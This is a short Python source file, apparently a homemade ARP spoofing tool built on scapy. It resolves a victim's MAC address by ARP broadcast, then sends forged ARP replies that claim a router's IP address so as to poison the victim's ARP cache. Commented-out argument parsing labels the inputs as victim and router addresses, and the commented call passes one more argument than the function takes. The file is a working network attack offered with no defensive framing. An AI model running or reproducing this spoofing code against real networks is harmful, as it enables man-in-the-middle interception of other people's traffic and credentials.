import scapy.all as scapy
import argparse

def get_mac_by_ip(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast / arp_request
    
    ans = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return ans[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac_by_ip(target_ip)
    packet = scapy.ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip
    )
    scapy.send(packet)



# argparser = argparse.ArgumentParser()
# argparser.add_argument('-ti', type=str, dest='ti', help='IP of victim') # target ip
# argparser.add_argument('-tm', type=str, dest='tm', help='MAC of victim') # target mac
# argparser.add_argument('-ri', type=str, dest='ri', help='IP of route') # route ip
# args = argparser.parse_args()

# spoof(args.ti, args.tm, args.ri)



